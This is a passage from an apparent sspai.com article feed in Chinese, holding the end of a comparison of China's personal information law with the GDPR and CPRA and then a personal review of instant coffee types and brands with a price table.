则进一步细化，形成了「个人—数据控制者—数据处理者」的三方主体关系。</p>\n<p>这里需要注意，GDPR 的「处理者」仅仅表示代表「控制者」处理个人信息的主体，「控制者」则指的是决定个人信息处理目的和方式的主体。其中，数据控制者是 GDPR 下履行义务的主要主体，数据处理者主要根据与数据控制者之间的合同义务行事，GDPR 下的法定义务则相对少一些。相反，我国个保法则没有区分处理者与控制者，而是统称为「个人信息处理者」，两者都要遵守个保法下的各项义务。</p>\n<p>CPRA 则采用了另一套分类方法，区分了「企业」、「服务提供商」和「承包商」三类主体。其中，「企业」的定义接近 GDPR 的「数据控制者」，其限定于在加州开展业务的营利组织，且需要在上一年度总收入、处理的个人信息数量及个人信息处理与收入的联系上满足一定的门槛。符合条件企业所控制的实体、合营企业及其他自愿受约束的主体也被囊括在「企业」的范围之内。实际上，只有「企业」承担 CPRA 下的义务；至于「服务提供商」和「承包商」，则只需根据其与「企业」的合同行事，不直接受 CPRA 约束。</p>\n<p>上述不同主体区分方式以及相应义务如下图所示：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/73c7e6577dc241aecd7472edd6974976\"></figure><p>比较而言，欧盟 GDPR 与美国 CPRA 区分角色的行为能够细化各个主体的义务与责任，更加有利于产业的发展和保护；而我国个保法统一定义为「个人信息处理者」的模式则更加有助于个人信息的保护。</p>\n<p>此外，在主体区分问题上，各法规还体现出一些特色：</p>\n<ul>\n<li>个保法制定了针对<strong>重要互联网平台</strong>的特殊义务，这与欧盟《数字市场法案》（Digital Market Act）提案中对于「守门人」数据保护义务的规定相似。</li>\n<li>GDPR 和个保法均对<strong>小型企业</strong>进行特别规定。具体而言，GDRP 对于员工少于 250 人的组织放宽了记录保存的相关规定，并鼓励充分考虑微型、小型和中型企业的特殊需求。个保法则规定，将针对「小型个人信息处理者」制定专门的个人信息保护规则、标准，但定义仍有待明确，相应的规则、标准也有待后续制定。</li>\n</ul>\n<h2>信息主体的权利：框架相似，详略不同</h2>\n<p>与义务相对的是权利。在之前的文章中，我们已经介绍过个保法赋予信息主体的权利，包括知情权、更正权、限制权、删除权、拒绝权、数据可携权等；这些权利在 GDPR 和 CPRA 中也都有类似的表述。</p>\n<p>不过，值得指出，个保法对权利的规定是较为简略，以列举权利名称为主，具体内涵则暂未进一步解释；而 GDPR 和 CPRA 对每种权利都进行了细致规定。</p>\n<p>此外，较有特色的是，CPRA 规定了拒绝后不受报复的权利，中国个保法规定了死者近亲属对死者个人信息拥有的权利。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/d357f5a75a948552aa8d8eab7a40f98b\"></figure><p>我们在介绍个保法时还讨论过「大数据杀熟」的现象和个保法的相应规定。实际上，这类「自动化决策」问题在全世界都是备受关注的。自动化决策的决策逻辑依托算法等技术，在外界看来具有不透明性，是难以监督的「黑箱」。因此，不论是从企业合规的角度还是政府监管的角度，对这种处理行为的监管都存在着比较大的挑战。</p>\n<p>在这样的背景下，个保法之外的两部法律也都对自动化决策作出了规定，也是情理之中的。总结起来，三部法律均关注到了自动化决策中对个人信息的保护问题，总体上都要求<strong>决策逻辑需透明，决策结果需公平公正，且需保证用户拥有拒绝权</strong>。其中，GDPR 和个保法对用户的拒绝权和处理者的义务做出了一些较为具体的规定，而 CPRA 目前只预留了一个监管空间，将具体合规要求留待后续进一步法令。值得注意的是，我国个保法还规定，不得利用自动化决策进行差别待遇。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/92aac2aff4c72403c35bfb524de703e9\"></figure><h2>个人信息跨境传输：「白名单」与「提条件」</h2>\n<p>规范数据的跨境传输是目前全球普遍的立法趋势。个人信息是一种重要的数据类型，对此，欧盟和中国都对其跨境传输进行了限制。我们此前已经对我国的管理方式做出过介绍，这里再与 GDPR 做一比较。（CPRA 是州层面的立法，不涉及个人信息的跨国传输。）</p>\n<p>首先，个保法和 GDPR 的共同之处在于，对于个人信息跨境传输的<strong>限制是单向的</strong>，即只监管个人信息的流出，而不监管个人信息的流入。</p>\n<p>但两部法律的区别在于，GDPR 采取了一种类似「白名单」的方式，个保法则规定了向境外传输的具体条件。</p>\n<p>具体而言，GDPR 首先规定了一个「充分保护水平认定」的名单，向名单上的国家、地区或组织转移数据的，不需要采取特别的保障措施。如果不在名单上，则需要根据 GDPR 的规定，采取适当的保障措施才能够进行个人信息的跨境转移。</p>\n<p>除了上述两种基本规则外，GDPR还规定了两个特殊规则：一是在存在有效国际协议的情况下，可以基于司法判决、行政决定等进行跨境传输；二是在满足特定的条件后，即使缺乏充分保护认定以及适当的保障措施，也可以进行跨境转移。</p>\n<p>至于个保法，如之前文章所述，其规定满足下列四个条件之一的，方可以向境外转移：</p>\n<ul>\n<li>通过网信部门组织的安全评估；</li>\n<li>按照网信部门的规定经专业机构进行个人信息保护认证；</li>\n<li>按照网信部门制定的标准合同与境外接收方订立合同，约定双方的权利和义务；</li>\n<li>法律、行政法规或者国家网信部门规定的其他条件。</li>\n</ul>\n<p>此外，个保法对涉及一些特殊处理者、接收方的跨境传输提出了专门要求。例如，「关键基础设施」运营者存储于境内的个人信息，确需向境外提供的，必须通过国家网信部门组织的安全评估；境外的司法或者执法机构要求提供存储于境内的个人信息的，应当经主管机关批准等。</p>\n<h2>法律救济与法律责任：公益诉讼助维权，高额罚款是趋势</h2>\n<p>权利和义务都要通过责任来保障。对此，三部法律都规定了侵犯个人信息利益的行为，个人有权提起诉讼，而违法主体要承担罚款等后果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/9a138b3b4036fcd399736a12cc74a856\"></figure><p>从上图可见，关于救济方式，个保法和 GDPR 在消费者提起民事诉讼的权利基础上，还规定相关组织（个保法规定还包括检察机关）可以就个人信息侵权行为提起<strong>公益诉讼</strong>，增强了消费者提起诉讼的权利。而 CPRA 则规定，消费者提起诉讼后，企业有 30 天纠错期，期间企业纠正行为并声明后，消费者不得提起诉讼，这则对消费者提起诉讼的权利进行了限制，增强了对企业的保护。</p>\n<p>关于法律责任，GDPR、个保法以及 CPRA 都对违法个人信息保护的行为规定了罚款。就罚款额度而言， GDPR 的额度最高，处罚最严厉；个保法次之，而且其规定了多种处罚类型，且采取了双罚制的规定，企业与直接主管人员都要为不当信息处理行为负责。美国 CPRA 规定的罚金数额则比较低，且规定将把罚款存入消费者隐私基金。</p>\n","link":"https://sspai.com/post/69116"},{"title":"尝试了几十种速溶咖啡后，想和你聊聊移动咖啡馆","date":"2021-10-07 03:21:49","description":"\n<p>我离不开咖啡，是那种从肉体到精神层面的都离不开，每天早上用第一杯咖啡开启高效工作是做作的奉承，但每天早上嘬下的第一口拿铁是疲惫生活里最强的一针肾上腺素是我对咖啡最恰如其分的赞歌。</p>\n<p>一直以来我对咖啡的要求介于随性和苛刻之间，随性是指我不太纠结豆子的烘焙、产地甚至新鲜程度，我可以在电商购物节里在销量排名最高的店铺一次性买上十数包豆子扔柜子里慢慢喝，同样的研磨度和萃取时间因为新鲜度流失无论出来的咖啡液是标准的 36g 还是稀稀拉拉的 60g 我都能微笑又满足的一饮而尽；但我讨厌速溶咖啡，讨厌到尽管曾经只喝过雀巢三合一，朋友非要让我试试并给了我一颗三顿半我能在咖啡机旁摆一年也不愿意尝试一下被聊得热热闹闹的冻干到底是啥滋味。</p>\n<p>我能隐隐喝出精品咖啡店里手冲小卡片上的前中后味，但我依然更喜欢中深烘焙豆子流出的黝黑 shot，再配上蛋白质含量越高的牛奶对我来说就是越好喝的咖啡。</p>\n<p>所以当我说「我喜欢喝咖啡」的时候，并不代表我是一个精致的咖啡猎人，咖啡于我就是一种附赠感性愉悦的功能性饮料，只要它能让我虎躯一震，并且香醇入口，那么它就是一杯好咖啡——我想和我这样的普通咖啡成瘾者应该很多，所以这次作为一个尝试了数十种不同技术和口味的速溶新人，我想就像平日里喝咖啡那样，只要快乐和好喝，不谈虚头巴脑的这那那这，看看如果没有咖啡机，我们到底能不能喝上一杯好咖啡。</p>\n<h2>我都试了哪些咖啡</h2>\n<p>最早在了解现在主流热门的速溶咖啡时，看到很多人说「可不要拿雀巢那种垃圾速溶和我们冻干、挂耳比」，所以我也有那么一阵恍惚「速溶咖啡特指雀巢三合一」，但后面想了想，「速溶」的对立面应该是「讲究」——你要花钱买咖啡机、买磨豆机、要了解选配最好口味的豆子、要苛求研磨度、萃取时间和和压力、要打出细腻绵密的奶泡、还要能拉出独角兽。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/2f56e381a6aa2fb6cbbe3311e44b2ce7.jpg\"></figure><p>所以反推并强调——全文我所提及的速溶是只需要杯子和水（包含冷热水和冷热奶）就能做出来的咖啡，至于雀巢还是三顿半永璞明谦，它们都在同一个起跑线上，只是售价和加工技术的不同。</p>\n<p>我先列举一下在撰写本文前我都尝试过的咖啡：</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td><strong>品牌</strong></td>\n<td><strong>型号</strong></td>\n<td><strong>类别（储存条件）</strong></td>\n<td><strong>包装（数量*单件重量）</strong></td>\n<td><strong>单价（人民币）</strong></td>\n<td><strong>冲泡条件</strong></td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"3\">\n<p>明谦</p>\n<p> </p>\n</td>\n<td>嘿可可</td>\n<td>袋泡</td>\n<td>15*10g</td>\n<td>4</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>冰滴咖啡黄金曼特宁、耶加雪菲</td>\n<td>咖啡液（冷藏）</td>\n<td>10*30ml</td>\n<td>4.27</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>超精品即溶黄金曼特宁、耶加雪菲</td>\n<td>冻干</td>\n<td>10*2g</td>\n<td>4.45</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"6\">\n<p>科林</p>\n<p> </p>\n</td>\n<td>数字挂耳 5 号</td>\n<td>挂耳</td>\n<td>20*12g</td>\n<td>3.6</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>硬盒超即溶混合装</td>\n<td>冻干</td>\n<td>12*3g</td>\n<td>7.42</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>热泡拿铁</td>\n<td>袋泡</td>\n<td>20*10g</td>\n<td>3.45</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>冰酿奶萃</td>\n<td>袋泡</td>\n<td>20*10g</td>\n<td>3.45</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>速溶纯黑咖啡粉</td>\n<td>高温干燥咖啡粉</td>\n<td>227g</td>\n<td>0.32（按照官方冲泡要求 126 杯计算）</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>小萌蛋多彩装</td>\n<td>咖啡液（常温）</td>\n<td>12*18g</td>\n<td>4.92</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>\n<p>UCC</p>\n<p> </p>\n</td>\n<td>职人咖啡</td>\n<td>高温干燥咖啡粉</td>\n<td>90g</td>\n<td>1.31（按照官方冲泡要求 45 杯计算）</td>\n<td>热水</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"2\">瑞幸</td>\n<td>花漾特调</td>\n<td>冻干</td>\n<td>12*3g</td>\n<td>7.93</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>元气弹</td>\n<td>冻干</td>\n<td>18*2g</td>\n<td>5.5</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"2\">雀巢</td>\n<td>馆藏拿铁</td>\n<td>三合一</td>\n<td>20*19</td>\n<td>3.33</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>金牌空气咖啡</td>\n<td>冻干</td>\n<td>50g</td>\n<td>2.36（按照官方冲泡要求 25 杯计算）</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>企鹅市集</td>\n<td>冷萃咖啡液</td>\n<td>咖啡液（冷藏）</td>\n<td>10*30ml</td>\n<td>6.9</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"4\">三顿半</td>\n<td>手冲滤挂式咖啡粉深度烘焙</td>\n<td>挂耳</td>\n<td>10*10g</td>\n<td>5.9</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>冷萃滤泡咖啡拿铁拼配</td>\n<td>袋泡咖啡</td>\n<td>10*12g</td>\n<td>6.9</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>茶粉混合装</td>\n<td>冻干</td>\n<td>18*1g</td>\n<td>4.94</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>精品速溶冻干</td>\n<td>冻干</td>\n<td>18*2g</td>\n<td>4.94</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"5\">永璞</td>\n<td>闪萃即溶咖啡液黑咖啡、榛果咖啡、柚子咖啡</td>\n<td>咖啡液</td>\n<td>7*25g</td>\n<td>8.05</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>乌龙咖啡</td>\n<td>冻干</td>\n<td>12*2.2g</td>\n<td>8.25</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>冷萃咖啡液经典、埃塞俄比亚、云南石端正、云南紫叶云澜、云南皓月旷野</td>\n<td>咖啡液</td>\n<td>10*22ml</td>\n<td>4.58</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>冷萃飞碟冻干</td>\n<td>冻干</td>\n<td>12*2.8g</td>\n<td>8.25</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>闪萃茶液</td>\n<td>茶液</td>\n<td>7*25</td>\n<td>8.05</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>AGF</td>\n<td>MAXIM 黑咖啡</td>\n<td>高温干燥咖啡粉</td>\n<td>20*2g</td>\n<td>2.4</td>\n<td>热水</td>\n</tr>\n</tbody></table></figure><p>以上这些是我在咨询了一些常喝速溶咖啡的作者和朋友后下单的，另外我也对比了一下「速溶咖啡」、「冻干」和「咖啡液」等关键词下的销量排序，它们几乎也都是目前速溶咖啡界的「顶流」，所以我将从它们开始自己的速溶咖啡新世界。</p>\n<h2>速溶咖啡的技术与升级</h2>\n<p>想必很多人和我一样都是在小时候从雀巢知道咖啡，再从星巴克明白什么是咖啡与速溶咖啡，但其实速溶咖啡的历史远比我们想象中的久远。</p>\n<p>早在一百三十多年前新西兰人 David Strang 便发明并登记了咖啡粉的专利，而后经过数次改良最终由雀巢以喷雾干燥技术正式风靡世界并沿用至今。这种技术简单来说就是利用高温热气喷射咖啡萃取液使其水分蒸发，最后形成可溶于水的咖啡粉，但凡事有利有弊，相比正常手磨咖啡粉制作出来的咖啡，这种速溶咖啡粉在高温下已经失去了咖啡特有的芳香物质，你喝到的就成了一杯毫无生命力的苦水。</p>\n<p>但雀巢厉害的是想到了给咖啡「调味」，不仅在前期咖啡粉制作过程中添加可溶性碳水化合物增加咖啡香气，还「买一赠一」附上了声名远扬的「咖啡伴侣」，甚至之后直接奶精香精三合一的便携包。这一举动虽仍然被咖啡爱好者诟病「咖啡之耻」，但意外的是被许多之前接受不了咖啡苦涩味的路人所喜爱，成了一杯好喝又提神的「快乐水」。</p>\n<p>在确定这个选题之前以上便是我对速溶咖啡的所有认知，而因为这种工业化生产的速溶咖啡通常使用品质低劣的咖啡豆，同时我又非常喜欢咖啡中独特醇厚的酸苦滋味，所以可想而知我一直以来有多么嫌弃速溶咖啡。</p>\n<p>但现代新技术下的速溶咖啡着实让我再一次重新认识了速溶咖啡。</p>\n<h3>冻干速溶</h3>\n<p>「冻干咖啡」应该是目前口味最丰富也最受欢迎的速溶咖啡品类了，从技术上来讲，我认为它当算是对传统高温速溶法的一种升级。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ahhe5b34teh0gc1cag.jpeg\"><figcaption>永璞冻干工艺宣传图</figcaption></figure><p>我们知道水有三种形态——液体、固体和气体，在不同的温度和压力下它们之间能够互相转换，传统的速溶工艺是通过高温让咖啡萃取液中的水分蒸发，而冻干咖啡同样运用了水的升华特性，不同的是它是在真空低温的环境下使其升华留下易溶于水的咖啡粉。相比高温升华，冻干技术能更好的保留住咖啡原本的香气，最后也就不再只是喝下一杯「苦水」，而是尽可能还原其本质的咖啡。</p>\n<p>可冻干工艺说起来简单，它背后需要付诸的是高温工艺远不能比的生产（机器）成本，同时因为可以最大程度还原咖啡本身的香气，所以冻干技术原则上就需要使用更高品质的咖啡豆。最后得到的结果是前文表格中最高近 ¥8/杯的科林超即溶，它已经超过了我日常搭配咖啡机使用咖啡豆的成本，但成品肯定不能相提并论。</p>\n<p>不过这种说法并不准确，咖啡机本身的价值和耗时都是一杯咖啡的成本，而冻干只需要一个杯子和任意温度液体就可以出品的特性也是它价值的一部分。回过头来看我总是若有似无的强调价值或许是因为「速溶咖啡就等于劣质廉价咖啡」的刻板印象，但我想这个观念或许应该稍以改变。</p>\n<h3>速溶咖啡液</h3>\n<p>其实尝试之前我对速溶咖啡液的期待是最大的，因为无论高温低温升华获取速溶咖啡粉都会有芬芳物质流失，那如果是直接咖啡液封装应该就能获得最本味的还原了；对于冻干我更多是「可能就好一点点」的平平期待。</p>\n<p>可实际体验后的结果是我应该不会再继续购买咖啡液了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ahhedb34teit0pmp8g.jpeg\"><figcaption>永璞咖啡液制取流程</figcaption></figure><p>目前市售的咖啡液大多数为高温煮制和低温冷萃，简单来说就是我们在咖啡店里买到的浓缩版美式或冷萃咖啡，也有少部分例如科林的「小萌蛋」是用 129℃ 纯净水经 0.05s 的 500Kpa 高压萃取获得，再极速冷却、杀菌并封装。从口感上来讲低温冷萃的咖啡液更注重咖啡豆的风味还原，所以你能喝到它所标识的诸如坚果、柑橘和莓果等不同风味；而高温煮制的咖啡液苦感更浓，更像是一杯传统认知里的咖啡。</p>\n<p>但它们都有一个我认为致命的缺点，就是太淡——当然这是一个极其主观的评价，我一向喜欢咖啡特有的苦涩风味，印象中在东南亚喝过的特有的带烟熏味的咖啡是我感官愉悦的巅峰，我几乎不会主动去尝试精品咖啡店里的各种特色手冲，因为很难静下心来去品尝那些细微的复合滋味，就喜欢浓郁厚重醇香热烈的的苦涩咖啡。</p>\n<p>所以如果你平日里喜欢美式或者寻觅各种精品手冲，那么可能咖啡液更适合你；反之如果你和我这般永远的拿铁、Dirty 和馥芮白，那么或许冻干更适合你。值得一提的是，在此我仅讨论的是口味，但我个人的感受是咖啡液的咖啡因含量是略高于冻干咖啡的。</p>\n<p>目前市售的咖啡液通常分为冷藏和常温保存两种方式，并且前者保质期相对较短（通常在三个月左右），后者甚至能超过一年。从工艺上来讲，需冷藏保存的咖啡液通常是萃取后直接冷却封装，常温长期保存的则是在萃取后经过了高温杀菌再封装。从口味上来讲，前者保留了更多咖啡风味，更适合用来制作冰美式或者苏打水、鸡尾酒特调等需要体会咖啡复合风味的饮品，后者则有着更浓郁的苦涩滋味（非贬义），甚至还有大部分直接调配好的榛果、柚子等口味拿铁，可以直接淋入牛奶饮用，所以如果你和我这般大部分时候都是奶咖为主，那么选择常温保存的咖啡液即可。</p>\n<h3>挂耳与袋泡咖啡</h3>\n<p>在冻干和咖啡液风靡之前，挂耳咖啡应该是速溶咖啡界鄙视链的顶端，代表着即使是不方便喝新鲜咖啡但也绝不将就的骄傲。</p>\n<p>从某种程度来讲，挂耳咖啡其实就是精品店里手冲咖啡的另一种形态，如果你能掌握好水温和冲泡手艺，依然能得到一杯毫不逊色的精品咖啡，区别只在于店里通常是现磨咖啡豆冲泡，拥有完整的咖啡风味，而研磨后包装出售的挂耳咖啡总归是不断在流失新鲜度。所以如果你是手冲爱好者并且对挂耳咖啡感兴趣，非常推荐尝试，并且建议少量多次购买，尽可能都品尝最新鲜封装的挂耳咖啡。如果想要了解更多挂耳咖啡的知识，<a href=\"https://sspai.com/post/65645\" target=\"_blank\">非常推荐阅读这篇文章。</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/f74b4a7a658c7db1ddaae7734fa54c00.jpg\"></figure><p>现在我想重点讲讲袋泡咖啡。其实在挂耳咖啡风靡之时，我就想着为什么没有类似于茶包那样的袋泡咖啡，方便快捷，没想到真的在这次筹备内容的时候喜闻乐见了许多袋泡咖啡产品。</p>\n<p>其实袋泡咖啡本质上和挂耳咖啡类似，都是用滤袋封装新鲜研磨的咖啡粉出售，所以在购买时依然建议遵循「少量多次」的购买思路，不要迷信它的保质期，尽可能买最新鲜日期的产品并尽快饮用。另外我们有必要知道一个咖啡的特性，就是咖啡粉可溶于水的风味物质不全都是我们喜欢的，如果是热水浸泡的话最好在 5min 左右浸泡后立马丢弃，切不可像茶叶那般长时间甚至反复热泡，这样你真的会收获一杯刷锅水。</p>\n<p>袋泡咖啡是我在尝试了这几种形态的速溶咖啡后最意外的一种，用它做出来的冰拿铁非常入味丝滑，唯一美中不足的就是需要提前放在冰箱里冷藏八小时略嫌麻烦，但是是值得的。</p>\n<h2>那些值得买的速溶咖啡</h2>\n<p>说了这么多，主要是想要让大家对不同种类的速溶咖啡有个了解，不同生产技术封装的速溶咖啡不仅呈现的风味不同，也和你日常的咖啡选择有关，简单总结来说：</p>\n<ol>\n<li>如果你喜欢美式这样的纯咖啡，推荐速溶咖啡液，并且最好是冷藏保存的冷萃咖啡液，你可以放心跟着包装上标识的风味选购，最后成品几乎一致；</li>\n<li>如果你喜欢冰奶咖，并且时间充裕，可以选择袋泡咖啡，但需要注意冷藏时间最好控制在不多不少八小时，少了风味析出不足，多了可能就会变成刷锅水；</li>\n<li>冻干咖啡是一个不会出错的选择，无论是冷热冲泡美式或者奶咖，都能获得不错的体验，并且调制方便，值得一提的是现在大部分冻干咖啡粉都会标识适合美式或者奶咖，可以参照这个购买；</li>\n<li>挂耳咖啡见仁见智，它是「精品手冲爱好者不可抗力条件下的解决方案」，同时如果想要获得一杯好喝的挂耳还需要一定程度的冲泡技巧，不建议新手直接冲；</li>\n<li>永远不要买雀巢。</li>\n</ol>\n<p>而我作为冰奶咖爱好者，给你推荐几款一定要尝试的速溶咖啡。</p>\n<h3>明谦「超精品即溶咖啡#黄金曼特宁」，风味被还原得丰富又浓郁</h3>\n<p>冻干咖啡有一个致命的缺点就是它在干燥过程中总是会有风味流失，但明谦的这款「超精品即溶咖啡」却非常完美的还原了咖啡的复合风味。按照官方的描述，「采用了 A-R 香气还原技术，在咖啡还呈现液体时将香气统一收集，在冻干后再进行重置还原」，我反复搜索了相关信息也没有找到更详细的介绍，如果有了解的朋友也非常感激补充。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/6f95c7cf282c1db4a47ee87a8163d6eb.jpg\"></figure><p>从口味上来讲，它的确能尝到官方标识的「黑巧风味」，但如果只是这样就没啥可说的了，非常惊人的是它还能尝到一种很浓郁的醇厚香气，这种香气不是一种具体的味道例如常见的坚果莓果蜂蜜等，它就是咖啡本身的香气。怎么说呢，就像用猪油炒的蒜蓉菜心、大铁锅做出来的炖肉和满山跑老母鸡熬出来的鸡高汤，就像我们常说速溶咖啡是没有灵魂的，而这股香气给速溶咖啡带来了灵魂。</p>\n<p>这款咖啡有两种口味，分别是「黄金曼特宁」和「耶加雪菲」，前者适合奶咖后者更宜黑咖，如果你想要尝试冻干，它必须第一个被下单。</p>\n<h3>明谦「袋泡咖啡#嘿可可」，牛奶咖啡相亲相爱一家人</h3>\n<p>作为一个奶咖爱好者，如果是冰饮相比冰拿铁我更喜欢 Dirty，因为我默认咖啡与牛奶是没有那么容易融合在一起的。大多数时候喝冰拿铁都是从淡到淡，越喝越淡，所以还不如像 Dirty 那般直接大口咖啡包裹着冰润奶香三十秒一饮而尽。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/b89c2a094158c42f5771ad61047ef923.jpg\"></figure><p>但这款袋泡咖啡是真的让我第一次强烈体会到「冰奶咖」的魅力，经过八小时的冷泡奶香与咖啡香非常巧妙地融合在了一起，从第一口到最后一口都是同样的快乐，而且入口丝滑。对比同时购买的其它几款袋泡，他们要么就是析出的咖啡香气不足，要么就是过萃（按照官方建议时间）析出了很多糟糕风味虽不至于刷锅水但的确不是讨喜的成品。</p>\n<p>其实我花了不少时间纠结它和前一款冻干的推荐顺序，因为从口味来讲我更喜欢这款袋泡咖啡，最后想想八小时的冷萃条件似乎已经超出了「速溶咖啡」的特点——你不能随时随地想喝就喝。但相反的，即便你和我一样有完善的新鲜咖啡萃取条件，我也非常建议你购买尝试，在某个决心就待屋里啥也不干的周末提前准备好，给宅家的快乐加倍。</p>\n<h3>永璞「6.0 冷萃咖啡液#红色石端正庄园」</h3>\n<p>原则上我是不太喜欢咖啡液的，因为它的风味太丰富了。如果是冷萃咖啡液，在咖啡本身的风味之余会尝到一些奇奇怪怪的酸涩感，虽然可以理解为速溶咖啡的缺陷，但若是没有这个借口，放在新鲜咖啡上那完全就是一杯变质了的坏咖啡；而经过高温灭菌封装后可以常温冷藏的咖啡液虽然大部分烦杂风味被浓烈的咖啡苦涩隐藏，但与之相伴的是一种淡淡的橡胶味儿。总之在我购买的这些款咖啡液里，没有一款是让我满意想着以后再来一次的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/19159c615a988afd3a30c0f957db2e33.jpg\"></figure><p>但我也能理解读着此文的你是满脑袋不信的，所以我从中挑选了三款稍微那么适口的咖啡液分享给你，分别是来自永璞的「6.0 冷萃咖啡液#红色石端正庄园」、明谦的「冰滴咖啡液#黄金曼特宁」和企鹅的「冰滴鲜萃黑咖啡#中烘焙」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/e5a94f425acc1dd25440bbdd221d0161.jpg\"></figure><p>其中我建议一定要尝试的是永璞的「6.0 冷萃咖啡液#红色石端正庄园」，这款咖啡液非常适合做奶咖，其实我建议任何咖啡液都一定尝试奶咖，不要指望它能还原出一杯新鲜的美式，你得到的将会只是一言难尽的大杂烩。</p>\n<p>这款咖啡液使用的是云南保山咖啡豆，有明显的坚果和巧克力风味，异味感也较弱。</p>\n<h3>不建议把特调咖啡当口粮，但可以尝个鲜</h3>\n<p>无论冻干还是咖啡液，它们在萃取、回收和封装保存的过程中总会对咖啡原有的风味产生负面影响，可就像不新鲜的食材可以用重油重盐烹饪来弥补，这些遗憾也可以用所谓的「花式特调」来补全。但我不认为它们可以被作为解决方案，首先我对一切添加剂持保留态度，其次当我们想要来一杯花式特调的时候通常是想要喝一杯「好喝的含咖啡因饮料」，而它们只是对速溶咖啡的缺点稍加隐瞒，是远远达不到「好喝」程度的，所以我建议你不要抱太大希望试图将其作为「哪怕缺少条件也能拥有的一杯好喝饮料」。</p>\n<p>其次，就我个人体验上来讲，花式特调的速溶明显咖啡因含量不足，你几乎要两份的量才能拥有一杯足量的生命水，除非你只想喝这种带咖啡味儿的香精饮料，不然还是建议想要解馋的时候叫杯二十块不到的瑞幸满意度都会更高。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/ada140bb04e319b7dd7d6d28d4b860ac.jpg\"></figure><p>但尝鲜还是可以的，我推荐的是永璞的蜜桃乌龙冻干，首先本来乌龙茶香与咖啡就是比较契合的一个味道，两者相辅相成不会冲突，然后有一股微弱的蜜桃香气飘浮在里面。相比「特调」这种略显复杂的描述，我更喜欢称之为趣味，让普通又苦涩的咖啡多了一些乐趣和层次，非常适合某个烦闷的午后用来轻松一刻。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/73f36a27f8b8f1bf97d609aad7721d97.jpg\"><figcaption>瑞幸的花式特调你都不知道被调的是风味还是咖啡</figcaption></figure><p>其实从某种程度上来讲，我觉得雀巢那种香精三合一应该算是最古早的特调，而我这次购买的瑞幸花漾特调有一个与之相同的特点，就是「放肆」。前面之所以推荐永璞是因为它很克制蜜桃乌龙风味与咖啡本味之间的比例，淡化前者成为后者延绵过程中的点缀。但瑞幸的这些莫名其妙的什么菠萝、玫瑰、蔓越莓等风味几乎是和咖啡本味混杂在一起的，你不能说它难喝，但它已经不像是咖啡了。</p>\n<p>有趣的是在这次挑选测品的时候我无意间的决定让我发掘出了日后家中常备的饮料，它们分别是永璞的宇治抹茶液和三顿半的茶粉（我买的是混合装，每一种口味都很棒）。我一直觉得东方的茶和西方的咖啡都是大自然的瑰宝，可能是因为咖啡因的提神效果，也有可能是因为自己年纪大了，不过相比咖啡，我对茶更挑剔一些——喜苦不喜涩，所以通常我都更喜欢类似于乌龙、普洱这一类的茶以及宇宙之光抹茶。</p>\n<p>永璞的抹茶非常的浓郁，不是那种加了工业香精的浓郁，而是抹茶本有的醇厚，而且因为已经是液体的缘故，可以直接与冰牛奶搅和做出一杯非常好喝的冰无糖抹茶拿铁，其实你如果喜欢抹茶，就应该知道无糖类的抹茶饮料要想好喝对抹茶的品质要求是非常严苛的。</p>\n<p>至于三顿半的茶粉也是如此，它们同样用了和冻干咖啡一样的萃取、干燥和封装工艺，所以你可以得到一杯非常浓郁醇厚且本味的茶汤，而且它们易溶性非常好，很适合用来做茶拿铁。如果你不是非常想要尝试特调咖啡又想要喝上好喝的相对健康饮料，这两款速溶茶饮非常推荐你尝试。甚至作为一个坚定的新鲜萃取咖啡爱好者，我觉得速溶